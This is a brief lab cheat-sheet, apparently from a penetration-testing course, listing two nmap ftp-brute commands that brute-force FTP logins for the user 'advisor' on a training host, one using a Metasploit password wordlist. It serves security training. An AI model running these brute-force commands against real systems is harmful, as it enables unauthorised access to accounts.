# FTP

Perform brute force against ftp server with user advisor

* <mark style="color:yellow;">nmap --script=ftp-brute --script-args user=advisor demo.ine.local</mark>

#### Brute forcing by defining specific user and password list file:

* <mark style="color:yellow;">nmap --script=ftp-brute --script-args user=advisor,passdb=/usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt demo.ine.local</mark>

